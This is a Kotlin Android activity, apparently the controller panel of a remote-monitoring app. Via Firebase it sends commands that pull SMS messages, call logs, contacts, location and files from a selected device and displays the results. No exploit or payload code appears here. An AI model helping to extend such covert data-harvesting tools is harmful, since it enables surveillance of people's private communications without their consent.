package com.abuzahra.control

import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.Fragment
import com.abuzahra.control.databinding.ActivityMainBinding
import com.abuzahra.control.model.CommandResult
import com.abuzahra.control.model.Device
import com.abuzahra.control.service.FirebaseService
import com.abuzahra.control.ui.dashboard.DashboardFragment
import com.abuzahra.control.ui.control.ControlFragment
import com.abuzahra.control.ui.smscalls.SmsCallsFragment
import com.abuzahra.control.ui.files.FilesFragment
import com.abuzahra.control.ui.social.SocialFragment
import com.abuzahra.control.ui.settings.SettingsFragment
import com.google.firebase.database.ValueEventListener

class MainActivity : AppCompatActivity() {
    private var _binding: ActivityMainBinding? = null
    private val b get() = _binding!!
    private var resultListener: ValueEventListener? = null
    private var currentDevice: Device? = null

    companion object {
        var selectedDevice: Device? = null
        private const val TAG = "MainActivity"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            _binding = ActivityMainBinding.inflate(layoutInflater)
            setContentView(b.root)
            Log.d(TAG, "Layout inflated successfully")
        } catch (e: Exception) {
            Log.e(TAG, "FATAL: Layout inflate failed: ${e.message}")
            e.printStackTrace()
            finish()
            return
        }

        // Init Firebase service (safe)
        try {
            FirebaseService.init(this)
        } catch (e: Exception) {
            Log.e(TAG, "FirebaseService init error: ${e.message}")
        }

        // Setup bottom navigation
        try {
            b.bottomNav.setOnItemSelectedListener { item ->
                try { switchFragment(item.itemId) } catch (e: Exception) {
                    Log.e(TAG, "Nav item error: ${e.message}")
                }
                true
            }
        } catch (e: Exception) {
            Log.e(TAG, "BottomNav setup error: ${e.message}")
        }

        // Result panel close button
        try {
            b.ivCloseResult.setOnClickListener { b.resultPanel.visibility = View.GONE }
        } catch (e: Exception) {
            Log.e(TAG, "Close result error: ${e.message}")
        }

        // Welcome text
        try {
            val email = FirebaseService.userEmail
            b.tvTopTitle.text = if (email != null) "مرحباً، ${email.split("@").first()}" else "لوحة التحكم"
            b.tvDeviceCount.text = "جاهز"
        } catch (e: Exception) {
            Log.e(TAG, "Welcome error: ${e.message}")
        }

        // Load default fragment (delayed slightly to ensure layout is ready)
        try {
            b.fragmentContainer.post {
                try {
                    switchFragment(R.id.nav_dashboard)
                    Log.d(TAG, "Default fragment loaded")
                } catch (e: Exception) {
                    Log.e(TAG, "Default fragment error: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Post fragment error: ${e.message}")
        }

        Log.d(TAG, "onCreate completed successfully")
    }

    private fun switchFragment(itemId: Int) {
        try {
            val frag: Fragment = when (itemId) {
                R.id.nav_dashboard -> DashboardFragment()
                R.id.nav_control -> ControlFragment()
                R.id.nav_sms_calls -> SmsCallsFragment()
                R.id.nav_files -> FilesFragment()
                R.id.nav_social -> SocialFragment()
                R.id.nav_settings -> SettingsFragment()
                else -> DashboardFragment()
            }
            supportFragmentManager.beginTransaction()
                .replace(R.id.fragmentContainer, frag)
                .commitAllowingStateLoss()
        } catch (e: Exception) {
            Log.e(TAG, "switchFragment crash: ${e.message}")
            e.printStackTrace()
        }
    }

    fun selectDevice(device: Device) {
        try {
            selectedDevice = device
            currentDevice = device
            b.tvTopTitle.text = device.name.ifEmpty { device.model.ifEmpty { "جهاز" } }
            b.tvDeviceCount.text = if (device.isOnline) "متصل" else "غير متصل"
            try {
                b.ivDeviceStatus.setBackgroundResource(
                    if (device.isOnline) R.drawable.bg_status_online else R.drawable.bg_status_offline
                )
            } catch (_: Exception) {}
            listenResults(device)
        } catch (e: Exception) {
            Log.e(TAG, "selectDevice: ${e.message}")
        }
    }

    private fun listenResults(device: Device) {
        try {
            resultListener?.let { FirebaseService.removeResultListener(device.id, it) }
            resultListener = FirebaseService.listenForResult(device.id) { result ->
                if (result.status == "success" || result.status == "error") {
                    runOnUiThread {
                        try { showResult(result) } catch (e: Exception) { Log.e(TAG, "showResult: ${e.message}") }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "listenResults: ${e.message}")
        }
    }

    private fun showResult(r: CommandResult) {
        b.resultPanel.visibility = View.VISIBLE
        b.tvResultTitle.text = when (r.command) {
            "get_sms" -> "الرسائل"
            "get_calls" -> "المكالمات"
            "get_contacts" -> "جهات الاتصال"
            "get_location" -> "الموقع"
            "get_info" -> "معلومات الجهاز"
            "get_battery" -> "البطارية"
            else -> r.command
        }
        b.tvResultContent.text = if (r.result.length > 3000) r.result.take(3000) + "\n...(مقتطع)" else r.result
    }

    fun sendCommand(command: String, params: String = "") {
        try {
            val dev = selectedDevice
            if (dev == null) { Toast.makeText(this, "اختر جهازاً أولاً", Toast.LENGTH_SHORT).show(); return }
            Toast.makeText(this, "جاري الإرسال: $command", Toast.LENGTH_SHORT).show()
            FirebaseService.sendCommand(dev.id, command, params) { ok ->
                runOnUiThread { Toast.makeText(this, if (ok) "تم الإرسال" else "فشل", Toast.LENGTH_SHORT).show() }
            }
        } catch (e: Exception) {
            Toast.makeText(this, "خطأ: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            resultListener?.let { listener ->
                currentDevice?.let { d -> FirebaseService.removeResultListener(d.id, listener) }
            }
        } catch (_: Exception) {}
        _binding = null
    }
}
